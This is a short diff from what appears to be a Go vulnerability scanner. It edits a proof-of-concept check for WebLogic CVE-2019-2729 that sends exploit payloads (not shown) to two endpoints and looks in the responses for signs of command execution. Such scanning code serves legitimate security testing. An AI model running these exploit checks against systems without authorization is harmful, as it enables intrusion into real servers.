@@ -3532,7 +3532,7 @@ func CVE_2019_2729(url string) bool {
 	if req1, err := pkg.HttpRequset(url+"/wls-wsat/CoordinatorPortType", "POST", payload1, false, header); err == nil {
 		if req2, err2 := pkg.HttpRequset(url+"/_async/AsyncResponseService", "POST", payload2, false, header); err2 == nil {
 			req3, _ := pkg.HttpRequset(url+"/_async/favicon.ico", "GET", "", false, nil)
-			if (req1.StatusCode == 200 && strings.Contains(req1.Body, "uid")) || (req2.StatusCode == 202 && strings.Contains(req3.Body, "Vulnerable")) {
+			if (req1.StatusCode == 200 && pkg.StrContains(req1.Body, "uid")) || (req2.StatusCode == 202 && strings.Contains(req3.Body, "Vulnerable")) {
 				pkg.GoPocLog(fmt.Sprintf("Found vuln Weblogic CVE_2019_2729|%s\n", url))
 				return true
 			}
